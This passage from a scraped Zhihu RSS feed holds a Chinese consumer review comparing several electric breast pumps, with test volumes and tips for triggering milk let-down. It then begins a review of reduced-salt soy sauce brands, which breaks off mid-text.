data-private-watermark-src=\"\"></p>\n<p>测评价位从百元到万元不等，美德乐心韵由于其主机价格特别贵，因此选择租赁形式。</p>\n<p><b><u>电动吸奶器原理基本是相通的，都是通过先模拟宝宝吸吮节奏，刺激奶阵，然后开始收集乳汁</u></b>。它们的优势在于可以<b>兼顾效率和舒适</b>，尤其是双边电动吸奶器更是<b>大大节约妈妈们的排乳时间</b>。<b>它适合长期使用，也能兼顾外出、居家等不同的生活场景</b>。缺点是，不像手动吸奶器一样可以力度随心，无极调节。电动吸奶器的<b>力度都是“被设定的”</b>，<b>找到最适合自己的力度和产品，会需要一定的磨合和时间</b>。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-be47e863b9722dccb6f62e9c4c244040_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1231\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>在这几款电动吸奶器的测评中，美德乐心韵的体验特别棒！新贝以它超高性价比的表现，让我非常惊喜！</b>下面我分别写一下每款吸奶器的使用感受：</p>\n<h3><b>一、新贝8782吸奶器｜大黑马！</b></h3>\n<p>这款双边电动吸奶器是最令我惊喜的。<b>369元的价格，我本来没啥期待，但万万没想到是个大黑马！</b>它有专利双阀设计，主打双边变频吸乳。这个听概念一定没啥感觉，但当我在被各品牌吸奶器吸到麻木，奶阵一直爱来不来的时候。<b>它一阵别出心裁深深浅浅，轻轻重重地按摩袭来，让我奶阵立马就哗啦啦下来了</b>。当时，我就震惊了！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c0f97a0c814d7c2de66d4e49b2ce9f78_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>与市面上电动吸奶器普遍的按摩+吸吮2模式不同，新贝这款吸奶器有4个模式</b>。分别是：</p>\n<blockquote>泌乳模式：高频率刺激乳腺，高效实现喷乳反射；<br>变频模式：五轻一重循环刺激泌乳，提升奶阵几率；<br>吮吸模式：模拟宝宝吮吸频率，提升奶阵几率<br>吸乳模式：以缓和有力的节奏吸乳，实现快速排空。</blockquote>\n<p><b>这4种模式你可以简单理解为，前2种是按摩模式，哪个有感觉选哪个；后2种是吸奶模式，哪个舒服换哪个。</b>这种设计很好用。比如通常妈妈们的第二个奶阵会来得慢一点，被同一种按摩模式刺激太久也会减少泌乳的冲动。而这款的按摩模式就会多元一些，这项没感觉也没关系呀，换下一个！而且每个模式下都有9级档位，可以随时调到自己喜欢的感觉。冲着可以换“按摩手法”的设计，我就给它首推位了！</p>\n<p>另外<b>它还有一特别之处在可以两边交替吸乳。</b>一般情况下，双边吸奶器的操作模式是“左右同步收放”，这款吸奶器除兼顾前者外，还可以“左右左右”交替进行。我当时测评时觉得还挺舒服的。<b>由于吸吮方式多样，乳房得到充分的刺激，所以吸乳效率也高。</b></p>\n<p><img src=\"https://pic2.zhimg.com/v2-8957dede549d8b9dd2a71004cc4ec7a9_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"交替吸乳，点开看！\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>❤️客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，取吸奶器最大档、最小档各吸1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic4.zhimg.com/v2-5a7ef8aa6ddb0e58f513a025db7ded45_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"左边最小吸力，右边最大吸力\" data-watermark=\"watermark\" data-original-src=\"v2-5a7ef8aa6ddb0e58f513a025db7ded45\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：共约40ml （家庭实验结果仅供参考）</i></p>\n<p>它很<b>便捷，清洗无死角</b>。产品还附赠了两个奶嘴，吸完奶直接就可以套上奶嘴给宝宝喝了！少洗一次奶瓶，贴心省力！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-14021ec98c9dd1b7fc5227b5272cfb85_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>新贝这款电动吸奶器<b><u>性价比真的完胜</u></b><u>！</u>但是它还是有缺点的。比如它的<b>1.镜面按键容易误触，或者接触不灵敏</b>。另外就是，虽然我觉得这款电动吸奶器不痛，但这是建立在我乳腺畅通，奶量稳定的基础上。<b>2.如果是需要开奶、尚在月子中泌乳不稳定、乳头皲裂，或者比我还疼痛敏感的妈妈，建议租美德乐心韵（后面会写，请继续往下看）。</b></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429721248146853888\"></a><p><b>它也是我测评后唯一留下来的一款。</b></p>\n<h3><b>二、新安怡303电动吸奶器</b></h3>\n<p>我家也算是新安怡的老粉了，现在我宝宝嘴里就正嘬着新安怡的奶嘴~但这款吸奶器我体验下来觉得<b>无功无过</b>吧。<b>适合该品牌下忠诚度高的妈妈，不会让你失望，但也不会很出彩~</b></p>\n<p>它的安装比较便捷，清洗无死角。喇叭罩配备了花瓣气囊按摩，主动贴合乳房，可以缓解妈妈们吸奶过程中的不适。盒内赠送了两个奶嘴，吸完就可以直接套在奶瓶上给宝宝喝了，无需再倒出来喂哦，省心！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-77ef9092b1a6010636e20f341a460ee9_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>贴心的是，新安怡还附赠了一个收纳包，这样妈妈们外出就可以直接装在里面了，很方便！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ecb7cdf44ace535404cfdf340837aeb5_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>下面是缺点部分。首先<b>1.它这个吸奶器的设计有点上重下轻</b>，奶瓶立在桌子上很容易倾倒，当里面奶量不够多时需要非常小心地放平稳，不然奶洒漏出来好心疼。其次<b>2.对于疼痛敏感型妈妈，吸力算有点大</b>。即使只开了最低档，我测评了大概5分钟就不想继续了，因为觉得有点疼。<b>3.噪音在这几款当中是最大的</b>。 </p>\n<p><b>所以我只建议乳腺通畅，或者疼痛没那么敏感的妈妈买这款。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-339d00eb5020c08ebf65e8764b7e120b_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"539\" data-size=\"normal\" data-caption=\"低档吸力\" data-watermark=\"watermark\" data-original-src=\"v2-339d00eb5020c08ebf65e8764b7e120b\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>另外这款吸奶器在我实验时还出现了很奇怪的现象，不知是不是对贝亲奶瓶“不耐受”，竟然无论是最小档还是最大档位，都吸不出水。（但实际我亲测时，是能吸出奶的）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f572edd8857124152020af384420bcab_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"646\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f572edd8857124152020af384420bcab\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>所以此处没有实验结果。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429722254381363200\"></a><h3><b>三、兰思诺手电一体吸奶器</b></h3>\n<p>手动吸奶器的部分已经在前面写过，现在来写电动部分。它也是测评产品里面唯一一个单边电动吸奶器。<b>它适合追求小巧，预算有限，追求一机多用的妈妈。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-85f6e42aaf9c0ded22ef7e7c5dab6c6d_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它的特点在于主机真的非常小，个头比手机还小些，放在包里真是不占地方。另外一个亮点是自带安卓充电口，即使忘记带充电线了，随便找个充电宝就能续航了。就算连充电宝都没有，那就把配件换一下，改成手动吸奶器呗！厉害吧，这种设计还是很用心的。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e35e4ba4a454b3ad040bb3532079fdf_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"2666\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它的配件可以完全拆卸，清洁无死角。喇叭罩边缘采用的是TPE材质，手感类似硅胶，较传统的塑料边缘来说，柔软亲肤些。</p>\n<p>缺点也很明显，<b>1.最低档的吸力太大</b>，不适合疼痛敏感型妈妈，也不适合有开奶需求，或者乳腺淤堵的妈妈。这些群体妈妈用起来应该会比较痛。此外<b>2.它的噪音也不小</b>。<b>3.无屏幕显示时间</b>，使用起来不是很方便。不知道吸了多久，心里也没数。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-35b964f42f44097cdea5c1714eb6c396_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"低档吸力\" data-watermark=\"watermark\" data-original-src=\"v2-35b964f42f44097cdea5c1714eb6c396\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>❤️客观吸奶量</b></p>\n<blockquote>用奶瓶装满水模拟吸奶，取吸奶器最大档、最小档各吸1分钟，记录最终的吸奶量。</blockquote>\n<p><img src=\"https://pic2.zhimg.com/v2-1368e9fc1acff1b88f8a0325adb0ff66_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1368e9fc1acff1b88f8a0325adb0ff66\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：共约40ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429722938093924352\"></a><h3><b>四、贝瑞克DS吸奶器｜多功能</b></h3>\n<p><b>贝瑞克DS吸奶器在所有测评产品里面，功能是最多的。</b>使用最低档按摩或吸奶时一点也不痛，适合疼痛敏感型妈妈。</p>\n<p><b>它有过人之处。其他吸奶器的吸力调节功能，只能双边同时调——即要么一起加，要么一起减。但贝瑞克是可以选择左边加，右边减，即左右按摩和排乳力度/频率完全自由</b>。比如有些妈妈有大小奶问题，或一边乳房受力，一边乳房不受力，那么这款吸奶器就可以为两边乳房选择不同的吸力和频率。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-566a1d00ebbf57b2e3e6d16544890237_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>除了按摩力度，吸奶力度分别可调外，贝瑞克DS吸奶器的按摩/吸奶节奏也可以调整。</b>有妈妈喜欢小力快节奏吸，有妈妈喜欢大力慢节奏吸，就有非常自由的调整空间。COOL！</p>\n<p>安装简单，配件可拆卸清洗无死角。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9f7e9e252a33fb44f9f88317d4186768_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它的缺点是<b>1.重且占地方</b>，只适合居家使用，不适合带出门。虽然<b>2.最低档吸奶不痛，但是吸奶效率就低了</b>。为了提高排乳效率，所以我会把吸力调高一点，找一个平衡值。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1be014dd8780bdf2386bec24edd40d31_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"低档吸力\" data-watermark=\"watermark\" data-original-src=\"v2-1be014dd8780bdf2386bec24edd40d31\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c0337f54b1ede5718757c198cb27f349_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-c0337f54b1ede5718757c198cb27f349\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：共约60ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429723475393470465\"></a><h3><b>四、美德乐丝韵翼吸奶器｜便携</b></h3>\n<p>这款吸奶器在各平台上简直被吹爆啦！到这个价位了，体验感都不会太差了。<b>它确实也无痛，和贝瑞克DS体验感差不多。美德乐丝韵翼相对贝瑞克DS胜在更便携；贝瑞克DS胜在功能更灵活更丰富。</b>妈妈们可以结合自己的需要选择。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d91a128317bdde791e86e1c80888bfcf_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它的安装非常简单，拆卸下来也完全没有清洁死角。与其他品牌喇叭罩不一样的是，美德乐是椭圆形的，可以横放或竖放找不同的角度。它里面附赠了24mm和21mm两副不同尺寸的喇叭罩，无需另外购置，给妈妈们多一份选择空间。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6f6cceadddea33a2d29a1782172924f1_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它也同样有缺点。比如<b>1.无屏幕，对于力度调节和时间都没有显示；2.在这个价位上功能不够丰富</b>；<b>3.略有噪音</b>，但在接受范围内。 </p>\n<p><img src=\"https://pic3.zhimg.com/v2-61ca6dab89f8c45dec6f2cd87f621048_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"低档吸力\" data-watermark=\"watermark\" data-original-src=\"v2-61ca6dab89f8c45dec6f2cd87f621048\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0cf0d0df99de3b0338d334c99fc1171f_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0cf0d0df99de3b0338d334c99fc1171f\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：共约60ml （家庭实验结果仅供参考）</i></p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429724339495612416\"></a><h3><b>五、美德乐心韵吸奶器｜疼痛敏感型妈妈必选</b></h3>\n<p>这台吸奶器我之前是没了解过的，在测评文章里看到知友们留言才开始关注。结果，<b><u>一测评就粉上头了</u>！</b>心韵是美德乐吸奶器里最高端的产品，属于医用级别了。只是它太太太贵了，所以我采用的是租赁方式，目前也是这台机器最主流的使用方式。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fa6a860272bf782b5619046dbf15276a_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>它非常非常适合月子里的妈妈！它的开奶模式我愿封之为神。心韵的开奶模式非常温和，真正是模仿新生儿的吮吸感。</b>我第一次测评时，是边在看综艺的，在我完全没管它的情况下，等我想起来再低头查看时，发现居然已经吸了100ml了！而我，完全没什么感觉！天哪~那一刻我实在是太震惊了！</p>\n<p><b>它无论是排空度还是舒适度，都比前面的普通家用吸奶器更好，而且没噪音。</b>安装和拆洗都非常简单，清洁无死角。最神奇的是，它的喇叭罩明明是普通的塑料，也没搞硅胶圈，按摩垫什么的，但这圈小塑料就是无比的贴合，无比的巴适，咋回事呢？她舒适到让我在写这款测评时，都觉得自己像托。</p>\n<p><b>月子里、特别怕痛的或者想提升奶量的妈妈特别适合这款。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4c700d7669b949b085dbc30cb8795548_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1124\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>它的缺点是，<b>1.太大太重了，拎着它跟块铁坨似的</b>。只能放在家里定点使用。<b>2.没有暂停键</b>，比如你想从开奶模式调到正常模式，就得关机重来，再走一遍程序。<b>3.屏幕不显示时间，且没有背光灯</b>，晚上不开灯啥也看不见。<b>4.和美德乐吸奶器其他配件不通用</b>，租这个的话还能重新再购买配件。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-338f7f4633c170f0d8434b5c15af0954_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"开奶模式\" data-watermark=\"watermark\" data-original-src=\"v2-338f7f4633c170f0d8434b5c15af0954\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-db12e4fe4c9cfb6966673e1bbc9a617c_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-db12e4fe4c9cfb6966673e1bbc9a617c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><i>测评结果：共约80ml （家庭实验结果仅供参考）</i></p>\n<p>妈妈们可以选择租回来试一下，后面再根据情况决定续租或者退回去都可以。我当时选的那家可以<b>7天试租</b>99元，一般租金650元/月，3个月以上550元/月。虽然我测评只用了7天，但当时我都想留着续租了，它以一己之力向我证明了：本人真的有奶！本人奶真的够！</p>\n<p><b>总而言之，好用！租它！</b></p>\n<p><i>（如果你连用心韵都痛，那就啥品牌吸奶器都别买了。请个专业的母乳指导上门先了解情况吧。）</i></p>\n<hr>\n<p><b><i>以上所有被测评的吸奶器都没有回流问题。</i></b></p>\n<h2>最后的小叮嘱</h2>\n<p>写到这里，我想多说一句。<b>吸奶器和其他产品测评不一样的地方在：它很难隔空给出一个完全适合你的建议。这也是我没有给出吸奶器排名的原因。</b>因为每个人的乳房条件都不一样，可能A妈妈觉得不痛的，B妈妈却觉得很痛。有的时候看到一些测评说XX产品超级不痛，你跟风买了发现“痛死我了”，其实并不一定是对方收了黑心广告钱，而是你跟对方的乳房条件不一样，可能她乳汁多，几分钟就吸完收工了，当然没啥痛咯；也可能她对疼痛并不敏感啊等等。所以本篇我同时用了比如吸奶瓶，吸气球展示等比较客观的展示方法。</p>\n<p><b>而且哦，吸力并不是越大越好。妈妈自我感觉最舒适的力度才可能分泌出最充沛的乳汁。</b>我一胎时不懂使用吸奶器，在奶水不够的情况下，每次都心急地开启大力吸奶模式，误以为力气越大吸出的奶越多。殊不知持续大力吸很容易把乳头吸伤，我自己越痛，奶阵越难以到来，于是耗在吸奶器上的时间也越多，形成恶性循环。最后乳头红肿皲裂，奶水也下不来，两败俱伤。<b>新手妈妈们请一定记住，在妈妈身心愉悦的状态下，奶阵才容易发生。</b></p>\n<p><b>为什么我如此强调奶阵呢？因为借助奶阵可以让你的吸奶效率大大提升。</b>试想一下你被吸奶器从乳房中一滴一滴拔出奶的感觉 VS 吸奶器一吸奶水就噗噗噗往外流。显然后者会让你轻松很多呀！这样一来，乳头被吸奶器拉扯的时间就少，乳房也能得到更好的休息，为下一次产奶蓄力。所以，选定一台适合自己的吸奶器很重要哦！</p>\n<h3>这里我再给大家提供一些刺激奶阵的小妙招：</h3>\n<p>1.吸奶前选择一个相对安静的房间，避开打扰，放松身心。</p>\n<p>2.喝一杯温开水。乳汁的大部分都是水，喝水不仅能补充身体水分，也能提醒我们的身体，准备吸奶了。</p>\n<p>3.如果有条件的话，可以热敷一下乳房。</p>\n<p>4.按摩你的乳房。可以轻轻触动乳头表面，轻而快地按压乳头；也可以用大拇指和食指握住乳头根部，往乳晕方向轻压；或者用手托住乳房，轻微抖动。哪种按摩方式最令你舒适，就采用哪种即可。</p>\n<p>5.当坐下来吸奶时，可以看看宝宝的视频，或者闻闻宝宝的味道，甚至录一段宝宝的哭声，这些小细节都有可能帮助妈妈们很快刺激出奶阵。</p>\n<p>以上，希望对大家有用。</p>\n<p>附：吸奶器总对比图</p>\n<p><img src=\"https://pic2.zhimg.com/v2-082ce73e13830d70bbcca157a2d02d4e_720w.jpg?rss\" data-rawwidth=\"852\" data-rawheight=\"479\" data-size=\"normal\" data-caption=\"\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>最后，谢谢你看到这里。我是 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/0ba3b5679cf13f66a8c6c551a7b04437\" data-hash=\"0ba3b5679cf13f66a8c6c551a7b04437\" data-hovercard=\"p$b$0ba3b5679cf13f66a8c6c551a7b04437\">@YUNYA麻麻</a>，一直对母婴领域用品保持着谨慎、理智的消费态度。如果你认为我还算值得信赖，欢迎点赞和关注哦！</p>\n<hr>\n<blockquote>我是 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/0ba3b5679cf13f66a8c6c551a7b04437\" data-hash=\"0ba3b5679cf13f66a8c6c551a7b04437\" data-hovercard=\"p$b$0ba3b5679cf13f66a8c6c551a7b04437\">@YUNYA麻麻</a> ，家有二胎的500强企业妈妈，2020年度新知答主，母婴盐究员，儿童教育优秀回答者。</blockquote>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yunyama-ma?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">YUNYA麻麻</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/348359318/answer/2159479799?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">243 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/485784624?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">母乳喂养的妈妈有没有必要买电动吸奶器？有没有200以内值得买的推荐？</a><br><a href=\"http://www.zhihu.com/question/458174777?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">母乳喂养只吃一侧，另一侧该不该用吸奶器?</a><br>\n","link":"http://www.zhihu.com/question/348359318/answer/2159479799?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国产酱油有哪些值得推荐?","date":"2021-10-08 06:28:58","description":"\n<p>非常高兴收到 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/9f4fb22e0686450a11c6d5dc122e4888\" data-hash=\"9f4fb22e0686450a11c6d5dc122e4888\" data-hovercard=\"p$b$9f4fb22e0686450a11c6d5dc122e4888\">@知乎生活</a> 的邀请，成为翻牌众测活动的「翻牌」嘉宾！那就开始吧~</p>\n<p>首先我们要知道，我们使用酱油的目的是提鲜，而不仅仅是增加咸味。所以，好的酱油可以让你提鲜的同时，减少钠的摄入。 </p>\n<p><b>那酱油中「鲜味」来自于哪里呢？</b> </p>\n<p>酱油中鲜味的来源主要是大豆和小麦在酿造过程中，蛋白质水解产生的氨基酸。我们一般用【氨基酸态氮含量】这个指标来衡量酱油的鲜味。它也是衡量一款酱油质量等级的指标。</p>\n<p>根据国标，氨基酸态氮含量≥0.8g的为特级酱油，≥0.7g是一级酱油，≥0.55g是二级酱油，≥0.4g是三级酱油。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3c9d16c4a4aef8ce58c693e25c7945f1_720w.jpg?rss\" data-rawwidth=\"535\" data-rawheight=\"132\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3c9d16c4a4aef8ce58c693e25c7945f1\" data-watermark-src=\"v2-cc809e0c4895484c08c3414fcb043641\" data-private-watermark-src=\"v2-fa12c3e47bf92cec618bebfae2316c68\"></p>\n<p>也就是说，【氨基酸态氮含量】越高，酱油会越鲜，酱油的品质相对也越高。但这可以代表是一款好的酱油了吗？</p>\n<p>我认为还不够。尤其是现在我们越来越关注饮食的健康，对「减盐酱油」「儿童酱油」的追求，也成了我们选择酱油的一种新需求。所以我这次买了32款市面上常见的酱油，想具体尝一尝，看一看，有没有真正减盐的好酱油？</p>\n<p><b>（内容有点长，晚点会持续更新下图片和视频！）</b></p>\n<h2> 一、纳入横评的减盐酱油品牌</h2>\n<p>这次所有评测的产品几乎均通过京东自营、天猫旗舰店和盒马渠道购入。一共买了19个品牌的32款产品。由于其中有3个品牌的4款产品并非酿造酱油，属于调味汁。所以主要对16个品牌的28款减盐酱油做了横向评测。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-094e38c8498e7be481c4ca73ac6f3ee4_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"369\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-094e38c8498e7be481c4ca73ac6f3ee4\" data-watermark-src=\"v2-fac61625ab271db0549a420f62927b30\" data-private-watermark-src=\"v2-16ce039e27a496a007832cb0c91b3881\"></p>\n<h3>01 传统品牌：10个品牌24款产品</h3>\n<ul>\n<li>l 李锦记：有4款产品，全部定位「减盐」。</li>\n<li>l 海天：有4款产品。其中3款定位「减盐」，1款定位「儿童」。</li>\n<li>l 欣和，有6款产品。其中4款六月鲜产品定位「减盐」，2款禾然有机产品定位「儿童」。</li>\n<li>l 玉兔，有3款产品。其中信芳园古方原酿定位「减盐」，秋田满满和应物喜饭定位「儿童」。</li>\n<li>l 加加，有2款减盐产品，各有1款定位「减盐」和「儿童」市场。</li>\n<li>l 万字，有1款减盐产品。但是区别于日本万字，本次纳入的是国产万字。</li>\n<li>l 此外东古、珠江桥牌、味事达、厨邦各有1款减盐产品，均定位传统减盐市场。</li>\n</ul>\n<h3>02 新兴品牌：2个品牌2款产品，定位儿童市场</h3>\n<ul>\n<li>l 小鹿蓝蓝：虽然是新兴品牌，但其实是山东淄博玉兔代工的。</li>\n<li>l 爷爷的农场：同样是代工生产，代工厂是山东烟台食圣。山东食圣还为多个互联网品牌代工生产，清一色的为贴牌产品。</li>\n</ul>\n<p><img src=\"https://pic2.zhimg.com/v2-a2fd2b5cf972f0ecc0c14df034bb482b_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"415\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-a2fd2b5cf972f0ecc0c14df034bb482b\" data-watermark-src=\"v2-a64bd4a0364f436911c31c64717f6a32\" data-private-watermark-src=\"v2-6535a681b810f3174c51c08aaac8c3ed\"></p>\n<h3>03 进口品牌：1个品牌2款产品</h3>\n<ul><li>l 禾泱泱：中国台湾进口产品，特色是365天足酿，有黑豆和昆布两款产品，定位儿童市场。在妈妈群体中的呼声很高，我和钱爸周围就有好几个朋友在用这个牌子的酱油。</li></ul>\n<p><img src=\"https://pic3.zhimg.com/v2-22484e75874b44e9edfe4dc0e0fa61fb_720w.jpg?rss\" data-rawwidth=\"553\" data-rawheight=\"415\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-22484e75874b44e9edfe4dc0e0fa61fb\" data-watermark-src=\"v2-03f68c158a412c7f3b92d0fbaac3e90b\" data-private-watermark-src=\"v2-886d93b85efc0389d4747bd582d6aa26\"></p>\n<h3>04 4款减盐调味汁产品</h3>\n<ul>\n<li>\n<b>l 雀巢美极</b>：宣传是减盐，但并非酿造酱油，属于调味汁。亮点在于配料里没有大豆，对大豆过敏的人可以选择这款调味汁替代酱油使用。口感上美极有点类似于宴会酱油的感觉，鲜甜为主，沾白煮蛋应该是绝配。</li>\n<li>\n<b>l 三井宝宝鲣鱼/昆布</b>：日本进口，属于调味汁而非酿造酱油，有两种口味。听名字就知道主打儿童市场。钠含量确实很低，两款产品均在500mg/15ml，口感上也非常讨巧，鲜里带甜，应该会很受孩子们喜欢。比如炖蛋的时候加一点味道应该是蛮灵的！</li>\n<li>\n<b>Bragg</b>：美国进口，同样属于调味汁，喷嘴的设计比较独特，控量方面具有优势。但是Brag的配料是真的另类，大豆蛋白+水，明显不同于酱油酿造的传统工艺。个人推断应该是水解大豆蛋白得到氨基酸的原理。口感吃起来的确是咸鲜味明显，但和我们习惯的酱油味道不一样。并且虽然产品明确说了不含盐，但钠含量换算后达到了960mg/15ml，在这批产品中算是高的。这样的产品根本不能手适合婴幼儿使用。这也提醒我们不要盲目听信一些进口产品的宣传，还是要回到减盐酱油的本质上来看待新鲜陌生事物。</li>\n</ul>\n<p><img src=\"https://pic1.zhimg.com/v2-a96090cf42290213d66fce673edf9b29_720w.jpg?rss\" 